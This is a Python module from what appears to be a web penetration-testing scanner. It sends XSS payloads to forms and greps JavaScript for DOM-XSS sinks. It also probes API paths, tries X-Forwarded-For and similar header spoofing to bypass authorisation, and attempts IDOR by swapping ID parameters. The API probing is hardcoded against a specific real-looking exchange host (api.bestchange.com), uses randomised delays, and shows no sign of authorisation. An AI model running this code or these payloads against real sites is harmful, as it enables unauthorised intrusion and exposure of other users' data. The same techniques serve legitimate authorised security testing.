#!/usr/bin/env python3
"""
Deep Analysis Module - Extended penetration testing
Focuses on client-side vulnerabilities, API testing, and business logic
"""

import re
import json
import time
import random
from urllib.parse import urlparse, urljoin, parse_qs
from bs4 import BeautifulSoup


class DeepAnalyzer:
    """Deep analysis for client-side vulnerabilities and advanced testing."""
    
    def __init__(self, session, base_url, intelligence, log_func):
        self.session = session
        self.base_url = base_url
        self.intelligence = intelligence
        self.log = log_func
        self.findings = []
    
    def analyze_js_dom_sinks(self):
        """Deep analysis of JavaScript DOM sinks for XSS vulnerabilities."""
        self.log("\n[DEEP JS ANALYSIS] Analyzing DOM Sinks for XSS", "BOLD")
        
        js_files = self.intelligence.get('js_files', [])
        if not js_files:
            self.log("  No JS files to analyze", "INFO")
            return []
        
        findings = []
        
        # DOM sinks that indicate potential XSS
        dangerous_patterns = [
            (r'innerHTML\s*=\s*([^;]+)', 'innerHTML assignment'),
            (r'outerHTML\s*=\s*([^;]+)', 'outerHTML assignment'),
            (r'document\.write\s*\(([^)]+)', 'document.write'),
            (r'eval\s*\(([^)]+)', 'eval() usage'),
            (r'new Function\s*\(([^)]+)', 'new Function() constructor'),
            (r'setTimeout\s*\(([^,]+)', 'setTimeout with string'),
            (r'setInterval\s*\(([^,]+)', 'setInterval with string'),
            (r'location\s*=\s*([^;]+)', 'location assignment'),
            (r'location\.href\s*=\s*([^;]+)', 'location.href assignment'),
        ]
        
        # User input sources
        input_sources = [
            r'location\.(search|hash)',
            r'window\.location',
            r'document\.URL',
            r'document\.referrer',
            r'\.value',
            r'\.textContent',
            r'\.innerText',
            r'getParameter',
            r'getQueryString',
        ]
        
        for js_url in js_files[:15]:  # Analyze first 15 JS files
            self.log(f"  Analyzing: {js_url[:70]}...", "INFO")
            
            try:
                response = self.session.get(js_url, timeout=15)
                if response.status_code != 200:
                    continue
                
                js_content = response.text
                
                # Find dangerous patterns
                for pattern, pattern_name in dangerous_patterns:
                    matches = re.finditer(pattern, js_content, re.IGNORECASE)
                    for match in matches:
                        code_snippet = match.group(0)[:100]
                        
                        # Check if user input might flow to this sink
                        context_start = max(0, match.start() - 200)
                        context_end = min(len(js_content), match.end() + 200)
                        context = js_content[context_start:context_end]
                        
                        has_input_source = any(re.search(source, context, re.IGNORECASE) for source in input_sources)
                        
                        if has_input_source:
                            finding = {
                                'type': 'DOM XSS (Potential)',
                                'severity': 'Medium',
                                'url': js_url,
                                'evidence': f"{pattern_name} found with potential user input flow",
                                'code_snippet': code_snippet,
                                'confidence': 60
                            }
                            findings.append(finding)
                            self.log(f"    ⚠ Potential DOM XSS: {pattern_name}", "WARNING")
                
            except Exception as e:
                self.log(f"    Error analyzing {js_url}: {e}", "ERROR")
                continue
        
        return findings
    
    def test_reflected_xss_detailed(self, forms):
        """Detailed XSS testing with multiple payload contexts."""
        self.log("\n[DETAILED XSS TESTING] Testing all input contexts", "BOLD")
        
        findings = []
        
        # Context-specific payloads
        xss_payloads = {
            'html': [
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "<body onload=alert('XSS')>",
            ],
            'attribute': [
                "' onmouseover='alert(1)' '",
                "\" onmouseover=\"alert(1)\" \"",
                "' onclick='alert(1)' '",
            ],
            'javascript': [
                "javascript:alert('XSS')",
                "';alert('XSS');//",
                "\";alert('XSS');//",
            ],
            'script': [
                "<script>alert('XSS')</script>",
                "<script>alert(String.fromCharCode(88,83,83))</script>",
            ],
            'encoded': [
                "%3Cscript%3Ealert('XSS')%3C/script%3E",
                "&#60;script&#62;alert('XSS')&#60;/script&#62;",
                "\\x3Cscript\\x3Ealert('XSS')\\x3C/script\\x3E",
            ],
        }
        
        for form in forms[:5]:  # Test first 5 forms
            form_url = urljoin(self.base_url, form.get('action', '/'))
            method = form.get('method', 'GET').upper()
            
            self.log(f"  Testing form: {method} {form_url[:60]}...", "INFO")
            
            # Build test parameters
            test_params = {}
            for input_field in form.get('inputs', [])[:3]:  # Test first 3 inputs
                input_name = input_field.get('name') or input_field.get('id', '')
                if input_name:
                    # Test HTML context payload
                    test_params[input_name] = xss_payloads['html'][0]
                    
                    time.sleep(random.uniform(1, 2))
                    response = self.session.request(
                        method,
                        form_url,
                        params=test_params if method == 'GET' else None,
                        data=test_params if method == 'POST' else None,
                        timeout=20
                    )
                    
                    if response and response.status_code == 200:
                        # Check if payload is reflected
                        if test_params[input_name] in response.text:
                            finding = {
                                'type': 'XSS (Reflected)',
                                'severity': 'Medium',
                                'url': form_url,
                                'parameter': input_name,
                                'payload': test_params[input_name],
                                'evidence': 'Payload reflected in response without encoding',
                                'confidence': 70
                            }
                            findings.append(finding)
                            self.log(f"    ⚠ XSS found in parameter: {input_name}", "WARNING")
        
        return findings
    
    def test_api_endpoints(self):
        """Test discovered API endpoints."""
        self.log("\n[API ENDPOINT TESTING]", "BOLD")
        
        findings = []
        api_subdomain = "https://api.bestchange.com"
        
        # Common API paths
        api_paths = [
            '/', '/v1', '/v2', '/api', '/rest', '/graphql',
            '/users', '/auth', '/login', '/register',
            '/rates', '/exchange', '/order', '/transaction'
        ]
        
        for path in api_paths:
            test_url = f"{api_subdomain}{path}"
            self.log(f"  Testing: {test_url}", "INFO")
            
            time.sleep(random.uniform(1.5, 3))
            try:
                # Test without auth
                response = self.session.get(test_url, timeout=15, allow_redirects=False)
                
                if response.status_code == 200:
                    content_type = response.headers.get('Content-Type', '')
                    
                    # Check for information disclosure
                    if 'json' in content_type:
                        try:
                            data = response.json()
                            # Look for sensitive data
                            sensitive_keys = ['password', 'token', 'secret', 'key', 'api_key', 'auth']
                            for key in sensitive_keys:
                                if key.lower() in str(data).lower():
                                    finding = {
                                        'type': 'Information Disclosure (API)',
                                        'severity': 'High',
                                        'url': test_url,
                                        'evidence': f"Sensitive key '{key}' found in API response",
                                        'confidence': 80
                                    }
                                    findings.append(finding)
                                    self.log(f"    ⚠ Sensitive data in response: {key}", "WARNING")
                        except:
                            pass
                    
                    finding = {
                        'type': 'API Endpoint Accessible',
                        'severity': 'Info',
                        'url': test_url,
                        'evidence': f'API endpoint accessible without authentication (Status: {response.status_code})',
                        'confidence': 100
                    }
                    findings.append(finding)
                    
                elif response.status_code in [401, 403]:
                    # Try common bypass techniques
                    bypass_headers = [
                        {'X-Forwarded-For': '127.0.0.1'},
                        {'X-Real-IP': '127.0.0.1'},
                        {'X-Originating-IP': '127.0.0.1'},
                        {'X-Remote-IP': '127.0.0.1'},
                    ]
                    
                    for header in bypass_headers:
                        time.sleep(1)
                        test_response = self.session.get(test_url, headers=header, timeout=15, allow_redirects=False)
                        if test_response.status_code == 200:
                            finding = {
                                'type': 'API Authorization Bypass',
                                'severity': 'High',
                                'url': test_url,
                                'header': header,
                                'evidence': 'API accessible with IP spoofing header',
                                'confidence': 75
                            }
                            findings.append(finding)
                            self.log(f"    ⚠ Authorization bypass with header: {list(header.keys())[0]}", "WARNING")
                            break
                
            except Exception as e:
                # Timeout or connection error - endpoint might not exist
                pass
        
        return findings
    
    def test_business_logic(self, forms, endpoints):
        """Test for business logic vulnerabilities."""
        self.log("\n[BUSINESS LOGIC TESTING]", "BOLD")
        
        findings = []
        
        # Look for exchange/transaction related endpoints
        exchange_endpoints = [e for e in endpoints if any(keyword in e.lower() for keyword in ['exchange', 'rate', 'order', 'transaction', 'click'])]
        
        for endpoint in exchange_endpoints[:10]:  # Test first 10
            parsed = urlparse(endpoint)
            if not parsed.query:
                continue
            
            params = parse_qs(parsed.query)
            
            # Test for IDOR - try accessing other users' data
            id_params = ['id', 'user_id', 'order_id', 'transaction_id']
            for id_param in id_params:
                if id_param in params:
                    original_id = params[id_param][0]
                    
                    # Try negative, zero, and other IDs
                    test_ids = ['-1', '0', '999999', str(int(original_id) + 1) if original_id.isdigit() else '1']
                    
                    for test_id in test_ids:
                        test_params = params.copy()
                        test_params[id_param] = [test_id]
                        
                        # Reconstruct URL
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                        
                        time.sleep(random.uniform(1, 2))
                        try:
                            response = self.session.get(test_url, params=test_params, timeout=15)
                            
                            if response.status_code == 200 and len(response.text) > 100:
                                # Check if we got different data
                                finding = {
                                    'type': 'IDOR (Potential)',
                                    'severity': 'Medium',
                                    'url': endpoint,
                                    'parameter': id_param,
                                    'test_id': test_id,
                                    'evidence': f'Different response for ID {test_id}',
                                    'confidence': 50
                                }
                                findings.append(finding)
                                self.log(f"    ⚠ Potential IDOR in {id_param}: {test_id}", "WARNING")
                                break
                        except:
                            pass
        
        return findings
    
    def test_csrf(self, forms):
        """Test for CSRF protection."""
        self.log("\n[CSRF TESTING]", "BOLD")
        
        findings = []
        
        for form in forms:
            if form.get('method', 'GET').upper() != 'POST':
                continue
            
            form_url = urljoin(self.base_url, form.get('action', '/'))
            
            # Check for CSRF token
            has_csrf = False
            for input_field in form.get('inputs', []):
                input_name = input_field.get('name', '').lower()
                if any(token in input_name for token in ['csrf', 'token', '_token', 'authenticity']):
                    has_csrf = True
                    break
            
            if not has_csrf:
                finding = {
                    'type': 'Missing CSRF Protection',
                    'severity': 'Medium',
                    'url': form_url,
                    'evidence': 'POST form without CSRF token',
                    'confidence': 80
                }
                findings.append(finding)
                self.log(f"  ⚠ Missing CSRF token: {form_url[:60]}", "WARNING")
        
        return findings
    
    def run_deep_analysis(self):
        """Execute all deep analysis tests."""
        all_findings = []
        
        # JS DOM Sink Analysis
        js_findings = self.analyze_js_dom_sinks()
        all_findings.extend(js_findings)
        
        # Detailed XSS Testing
        xss_findings = self.test_reflected_xss_detailed(self.intelligence.get('forms', []))
        all_findings.extend(xss_findings)
        
        # API Testing
        api_findings = self.test_api_endpoints()
        all_findings.extend(api_findings)
        
        # Business Logic Testing
        logic_findings = self.test_business_logic(
            self.intelligence.get('forms', []),
            self.intelligence.get('endpoints', [])
        )
        all_findings.extend(logic_findings)
        
        # CSRF Testing
        csrf_findings = self.test_csrf(self.intelligence.get('forms', []))
        all_findings.extend(csrf_findings)
        
        return all_findings
